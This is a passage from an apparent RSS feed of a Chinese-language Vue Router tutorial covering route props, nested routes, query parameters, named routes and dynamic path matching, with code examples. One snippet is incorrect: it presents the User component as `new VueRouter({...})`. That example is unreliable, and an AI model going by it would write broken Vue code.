      <pubDate>Tue, 26 Sep 2023 10:27:58 +0800</pubDate>
      
      <guid>/docs/vue/routers/passing-props/</guid>
      <description><![CDATA[路由的props配置可以让路由组件更方便地接收到参数。在组件中使用$route会让组件与路由紧耦合（使用组件必须配置路由）。通过props可]]></description>
      <content:encoded><![CDATA[<p>路由的<code>props</code>配置可以让路由组件更方便地接收到参数。在组件中使用<code>$route</code>会让组件与路由紧耦合（使用组件必须配置路由）。通过<code>props</code>可以解除组件与路由的紧耦合。</p>
<blockquote>
<p>注：使用<code>props</code>，让组件通过<code>props</code>接收参数，让路由通过<code>props</code>给组件传递参数。这样当组件被用在其它不使用路由的组件中时，组件依然可以通过<code>props</code>接收参数，而无需配置路由。</p>
</blockquote>
<hr>
<h1 id="对象模式" data-numberify>对象模式<a class="anchor ms-1" href="#对象模式"></a></h1>
<p>当<code>props</code>是一个对象时，它将被作为组件的<code>props</code>，原封不动地被传递给组件<code>props</code>。在<code>props</code>为静态的时候可以使用这种方式。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/promotion/from-newsletter&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">component</span><span class="o">:</span> <span class="nx">Promotion</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">props</span><span class="o">:</span> <span class="p">{</span> <span class="nx">newsletterPopup</span><span class="o">:</span> <span class="kc">false</span> <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></div><hr>
<h1 id="布尔模式" data-numberify>布尔模式<a class="anchor ms-1" href="#布尔模式"></a></h1>
<p>在路由中，给<code>props</code>设置一个为<code>true</code>的布尔值，路由会自动将当前的所有<code>params</code>通过<code>props</code>传递给组件。</p>
<p>例如<code>User</code>组件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="k">new</span>  <span class="nx">VueRouter</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;User&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">props</span><span class="o">:</span> <span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>通过以下方式给<code>User</code>配置路由，并以<code>props</code>形式将<code>params</code>传递给<code>User</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/user/:id&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">component</span><span class="o">:</span> <span class="nx">User</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">props</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>  <span class="c1">// 以 props 形式将 params 传递给 User 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></div><p>也就是说，当<code>props</code>设置为<code>true</code>时，<code>$route.params</code>将被设置为组件的<code>props</code>。</p>
<hr>
<h1 id="函数模式" data-numberify>函数模式<a class="anchor ms-1" href="#函数模式"></a></h1>
<p>将<code>props</code>设置为函数类型，可以在函数中定义传递给组件的<code>props</code>。这种方式可以包括将<code>query</code>、<code>parmas</code>作为<code>props</code>传递，传递静态的<code>props</code>等等。</p>
<p>函数模式的路由<code>props</code>，可以接收到一个<code>route</code>参数，这个参数的与其对应的路由组件实例中的<code>$route</code>类似，可以通过<code>route.query</code>和<code>route.params</code>获取Query参数和路径参数。</p>
<p>基本用法示例如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/searchUser&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">component</span><span class="o">:</span> <span class="nx">searchUser</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">props</span><span class="p">(</span><span class="nx">route</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">id</span><span class="o">:</span> <span class="nx">route</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="nx">route</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></div><p><code>props</code>可以使用Lambda表达式定义：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/searchUsers&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">component</span><span class="o">:</span> <span class="nx">searchUsers</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">props</span><span class="o">:</span> <span class="nx">route</span> <span class="p">=&gt;</span> <span class="p">({</span>
</span></span><span class="line"><span class="cl">      <span class="nx">id</span><span class="o">:</span> <span class="nx">route</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">name</span><span class="o">:</span> <span class="nx">route</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">name</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}),</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></div><p><code>props</code>可以使用解构赋值或多重解构赋值：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/searchUsers&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">component</span><span class="o">:</span> <span class="nx">searchUsers</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">props</span><span class="o">:</span> <span class="p">({</span><span class="nx">query</span><span class="o">:</span><span class="p">{</span><span class="nx">id</span><span class="p">,</span> <span class="nx">name</span><span class="p">}})</span> <span class="p">=&gt;</span> <span class="p">({</span><span class="nx">id</span><span class="p">,</span> <span class="nx">name</span><span class="p">}),</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></div><p>将所有的<code>query</code>和<code>params</code>作为<code>props</code>传递：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/searchUsers&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">component</span><span class="o">:</span> <span class="nx">searchUsers</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">props</span><span class="o">:</span> <span class="p">({</span><span class="nx">query</span><span class="p">,</span> <span class="nx">params</span><span class="p">})</span> <span class="p">=&gt;</span> <span class="p">({...</span><span class="nx">query</span><span class="p">,</span> <span class="p">...</span><span class="nx">params</span><span class="p">}),</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 嵌套路由</title>
      <link>/docs/vue/routers/nested-routes/</link>
      <pubDate>Mon, 25 Sep 2023 04:29:24 +0000</pubDate>
      
      <guid>/docs/vue/routers/nested-routes/</guid>
      <description><![CDATA[Vue 嵌套路由又称多级路由。一些应用程序的UI由多层嵌套的组件组成（即一个路由下又配置了其它几个路由）。通过Vue Router，可以使用嵌套路由]]></description>
      <content:encoded><![CDATA[<p>Vue 嵌套路由又称多级路由。一些应用程序的UI由多层嵌套的组件组成（即一个路由下又配置了其它几个路由）。通过Vue Router，可以使用嵌套路由配置来表达这种关系。</p>
<p>接<a href="../introduction">路由介绍</a>中的案例，为<code>Home</code>组件新增两个路由<code>News</code>和<code>Message</code>。</p>
<hr>
<h1 id="配置嵌套路由" data-numberify>配置嵌套路由<a class="anchor ms-1" href="#配置嵌套路由"></a></h1>
<p>首先是配置Router（<code>router/index.js</code>）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Vue</span> <span class="nx">from</span> <span class="s1">&#39;vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">VueRouter</span> <span class="nx">from</span> <span class="s1">&#39;vue-router&#39;</span>  <span class="c1">// 引入 VueRouter
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// 引入组件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="nx">Home</span> <span class="nx">from</span> <span class="s1">&#39;../pages/Home.vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">About</span> <span class="nx">from</span> <span class="s1">&#39;../pages/About.vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">News</span> <span class="nx">from</span> <span class="s1">&#39;../pages/News.vue&#39;</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">Message</span> <span class="nx">from</span> <span class="s1">&#39;../pages/Message.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">VueRouter</span><span class="p">)</span>  <span class="c1">// 应用 VueRouter 插件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// 创建并导出 Router
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">VueRouter</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="c1">// 一级路由
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/about&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">component</span><span class="o">:</span> <span class="nx">About</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="c1">// 一级路由
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/home&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">component</span><span class="o">:</span> <span class="nx">Home</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">children</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span> <span class="c1">// 二级路由，路径开头无需加 “/” 分隔符
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;news&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">component</span><span class="o">:</span> <span class="nx">News</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span> <span class="c1">// 二级路由
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;message&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">component</span><span class="o">:</span> <span class="nx">Message</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>在Router配置中，<code>routes</code>配置项的每个元素都是一级路由（<code>About</code>和<code>Home</code>）。在每个一级路由中，可以使用<code>children</code>配置项为每个一级路由配置其子路由，也就是二级路由。<code>children</code>配置项的配置方式与<code>routes</code>配置项基本一致。</p>
<p>路由可以配置多个级别，也就是说除了一级路由可以使用<code>children</code>配置二级路由外，二级路由也可以使用<code>children</code>配置三级路由，以此类推。理论上可以配置无限个级别的路由，但是在实际开发过程中，路由最多可能就配置到第六层级。</p>
<hr>
<h1 id="使用嵌套路由" data-numberify>使用嵌套路由<a class="anchor ms-1" href="#使用嵌套路由"></a></h1>
<p>配置完嵌套路由后，需要在对应的组件中使用<code>&lt;router-link&gt;</code>和<code>&lt;router-view&gt;</code>来链接和展示。</p>
<p>嵌套路由的使用方式与普通的一级路由一样，都是使用<code>&lt;router-link&gt;</code>和<code>&lt;router-view&gt;</code>来链接和展示路由组件。只不过<code>&lt;router-link&gt;</code>在使用时有一些小细节。</p>
<p>如上，在<code>Home</code>组件中为其子路由添加<code>&lt;router-link&gt;</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-link</span> 
</span></span><span class="line"><span class="cl">  <span class="na">class</span><span class="o">=</span><span class="s">&#34;list-group-item&#34;</span> 
</span></span><span class="line"><span class="cl">  <span class="na">active-class</span><span class="o">=</span><span class="s">&#34;active&#34;</span> 
</span></span><span class="line"><span class="cl">  <span class="na">to</span><span class="o">=</span><span class="s">&#34;/home/news&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  News
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-link</span> 
</span></span><span class="line"><span class="cl">  <span class="na">class</span><span class="o">=</span><span class="s">&#34;list-group-item&#34;</span> 
</span></span><span class="line"><span class="cl">  <span class="na">active-class</span><span class="o">=</span><span class="s">&#34;active&#34;</span> 
</span></span><span class="line"><span class="cl">  <span class="na">to</span><span class="o">=</span><span class="s">&#34;/home/message&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  Message
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>可以看出，为<code>News</code>和<code>Message</code>添加的<code>&lt;router-link&gt;</code>，其<code>to</code> Prop配置的都是以<code>/home</code>开头的完整的目录路径。</p>
<p>这是因为，如果使用相对路径，那么路由的路径可能会出错。</p>
<hr>
<h1 id="路由-query-传参" data-numberify>路由 Query 传参<a class="anchor ms-1" href="#路由-query-传参"></a></h1>
<p>路由有了嵌套的关系之后，必然会涉及到父子路由之间数据的传递。Vue Router可以像调用API一样，让路由通过Query的形式传递参数。</p>
<blockquote>
<p>Query传参形式也就是在URL后，以<code>?</code>为开始，使用<code>&amp;</code>分隔每个参数项的参数传递方式。例如：<code>http://localhost:8080/home/user?name=张三</code></p>
</blockquote>
<p>假设现在有个名为<code>MessageDetail</code>的路由组件，该组件是<code>Message</code>的子路由组件，且需要<code>Message</code>给他传递一些消息数据。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="cm">/* import... */</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">MessageDetail</span> <span class="nx">from</span> <span class="s1">&#39;../pages/MessageDetail.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">Vue</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">VueRouter</span><span class="p">)</span>  <span class="c1">// 应用 VueRouter 插件
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="c1">// 创建并导出 Router
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">VueRouter</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="c1">// 一级路由
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/about&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">component</span><span class="o">:</span> <span class="nx">About</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span> <span class="c1">// 一级路由
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/home&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">component</span><span class="o">:</span> <span class="nx">Home</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">children</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span> <span class="c1">// 二级路由
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;news&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">component</span><span class="o">:</span> <span class="nx">News</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span> <span class="c1">// 二级路由
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;message&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">component</span><span class="o">:</span> <span class="nx">Message</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">children</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span> <span class="c1">// 三级路由
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>              <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;detail&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">              <span class="nx">component</span><span class="o">:</span> <span class="nx">MessageDetail</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><h2 id="传递-query-参数" data-numberify>传递 Query 参数<a class="anchor ms-1" href="#传递-query-参数"></a></h2>
<p>在Vue Router中，使用<code>&lt;router-link&gt;</code>的<code>to</code> prop给Route组件实例传参。<code>&lt;router-link&gt;</code>传递Query参数有两种方式：</p>
<ul>
<li>
<p>字符串拼接：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-link</span> 
</span></span><span class="line"><span class="cl">  <span class="na">:to</span><span class="o">=</span><span class="s">&#34;`/home/message/detail?id=${message.id}&amp;title=${message.title}`&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  {{ message.title }}
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
</span></span></code></pre></div></li>
<li>
<p>传入对象：通过<code>v-bind</code>指令给<code>to</code> prop传递一个对象类型的参数。通过这个<code>to</code> prop对象指定传递的Query</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">:to</span><span class="o">=</span><span class="s">&#34;{
</span></span></span><span class="line"><span class="cl"><span class="s">  path: &#39;/home/message/detail&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s">  query: {
</span></span></span><span class="line"><span class="cl"><span class="s">    id: message.id,
</span></span></span><span class="line"><span class="cl"><span class="s">    title: message.title,
</span></span></span><span class="line"><span class="cl"><span class="s">  }
</span></span></span><span class="line"><span class="cl"><span class="s">}&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  {{ message.title }}
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在<code>to</code> prop对象中的<code>query</code>属性中配置传递的参数以及它们的值。<code>query</code>属性的<code>key</code>是传递的参数的名称，<code>value</code>是传递的参数的值（就像Axios的<code>params</code>配置那样）。</p>
</li>
</ul>
<h2 id="接收-query-参数" data-numberify>接收 Query 参数<a class="anchor ms-1" href="#接收-query-参数"></a></h2>
<p>接收参数需要在对应的路由组件中进行配置。</p>
<p>如上，在<code>MessageDetail</code>路由组件中，使用路由组件实例的<code>$route.query</code>对象接收并获取这些参数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">id</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$route</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">title</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">$route</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">title</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span>
</span></span></code></pre></div><p>Vue Router的Query参数都会被对应的路由组件的实例中的<code>$route.query</code>对象接收。通过<code>$route.query.argName</code>的形式获取这些参数的值。</p>
<blockquote>
<p>注：</p>
<p>获取Query参数的形式很固定，为了使代码更加简介、书写更加简便，可以如上使用<code>computed</code>属性来接收它们的值。当然还有其它更简便的方法。</p>
<p>在Vue Router中，使用Query形式传递的参数，即使它们在对应的路由组件中没有被使用，依然会被<code>$route.query</code>接收到。</p>
</blockquote>
<hr>
<h1 id="命名路由" data-numberify>命名路由<a class="anchor ms-1" href="#命名路由"></a></h1>
<p>当嵌套路由的路径过长时，在<code>&lt;router-link&gt;</code>的<code>to</code> prop中，就需要配置一串冗长的路径。通过为路由指定<code>name</code>字段，然后在<code>&lt;router-link&gt;</code>的<code>to</code> prop对象中使用<code>name</code>属性指定使用的路由。</p>
<p>修改上例，给<code>MessageDetail</code>的路由添加<code>name</code>，并且在<code>&lt;router-link&gt;</code>使用<code>to</code> prop的<code>name</code>指定它：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;MessageDetail&#39;</span><span class="p">,</span>  <span class="c1">// 路由名称
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;detail&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">component</span><span class="o">:</span> <span class="nx">MessageDetail</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">router-link</span> <span class="na">:to</span><span class="o">=</span><span class="s">&#34;{
</span></span></span><span class="line"><span class="cl"><span class="s">  name: &#39;MessageDetail&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s">  params: {
</span></span></span><span class="line"><span class="cl"><span class="s">    id: message.id,
</span></span></span><span class="line"><span class="cl"><span class="s">    title: message.title,
</span></span></span><span class="line"><span class="cl"><span class="s">  }
</span></span></span><span class="line"><span class="cl"><span class="s">}&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  {{ message.title }}
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">router-link</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>在<code>&lt;router-link&gt;</code>使用<code>to</code> prop的<code>name</code>指定了路由后，就无需使用<code>to</code> prop的<code>path</code>指定一段冗长的路径。</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Vue 动态路由匹配</title>
      <link>/docs/vue/routers/dynamic-matching/</link>
      <pubDate>Mon, 25 Sep 2023 04:27:20 +0000</pubDate>
      
      <guid>/docs/vue/routers/dynamic-matching/</guid>
      <description><![CDATA[在Vue Router中，路由路径有以下几种匹配形式： 静态匹配：即完全按照path中的内容，进行相等匹配。 动态匹配：根据path中定义的路径匹]]></description>
      <content:encoded><![CDATA[<p>在Vue Router中，路由路径有以下几种匹配形式：</p>
<ul>
<li><strong>静态匹配</strong>：即完全按照<code>path</code>中的内容，进行相等匹配。</li>
<li><strong>动态匹配</strong>：根据<code>path</code>中定义的路径匹配规则匹配多个路径。</li>
</ul>
<hr>
<h1 id="路径参数" data-numberify>路径参数<a class="anchor ms-1" href="#路径参数"></a></h1>
<p>Vue中的动态参数匹配使用的是<strong>路径参数匹配</strong>。路径参数是路径中的一个动态字段。路径参数的值会动态变化，根据这些路径参数的值，可以读取相应的数据或展示相应的页面。</p>
<p>例如，有个<code>User</code>组件对所有用户进行渲染，但用户ID不同。使用路径参数，可以让用户ID像路径中的某个资源或目录一样在URL中展示。变换不同的用户ID，就像切换目录一样路由到不同的用户界面。</p>
<p>使用路径参数包含3个步骤：</p>
<ul>
<li>在Router配置文件（<code>router/index.js</code>）中，配置路径参数的匹配规则。</li>
<li>使用<code>&lt;router-link&gt;</code>传递路径参数。</li>
<li>在对应的路由组件中使用<code>$route.params</code>接收路径参数。</li>
</ul>
<h2 id="配置路径参数匹配规则" data-numberify>配置路径参数匹配规则<a class="anchor ms-1" href="#配置路径参数匹配规则"></a></h2>
<p>在Router配置文件的<code>route</code>元素或<code>children</code>中的<code>path</code>属性上配置当前路由的路径参数匹配规则。</p>
<p>例如，在<code>User</code>路由组件中使用路径参数，其路由配置如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-JavaScript" data-lang="JavaScript"><span class="line"><span class="cl"><span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">User</span> <span class="nx">from</span> <span class="s1">&#39;../pages/User.vue&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">export</span> <span class="k">default</span> <span class="k">new</span> <span class="nx">VueRouter</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">routes</span><span class="o">:</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">path</span><span class="o">:</span> <span class="s1">&#39;/user/:id&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">component</span><span class="o">:</span> <span class="nx">User</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>如上<code>User</code>的路由规则可以使用<code>/user/zhangsan</code>、<code>/user/lisi</code>等方式映射。</p>
